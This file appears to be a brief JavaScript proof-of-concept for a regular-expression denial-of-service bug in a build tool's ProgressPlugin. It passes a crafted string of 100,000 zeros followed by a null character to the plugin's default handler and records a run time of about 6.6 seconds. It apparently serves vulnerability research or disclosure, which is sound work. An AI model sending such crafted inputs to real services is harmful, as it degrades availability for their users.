const ProgressPlugin = require("./ProgressPlugin.js");

//Attack String :""+"0"*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "0";
}
str += "\u0000";

var result = ProgressPlugin.createDefaultHandler(true, "a")(1, str);

// real    0m6.608s
// user    0m6.587s
// sys     0m0.010s

//运行完正则所在行后报错
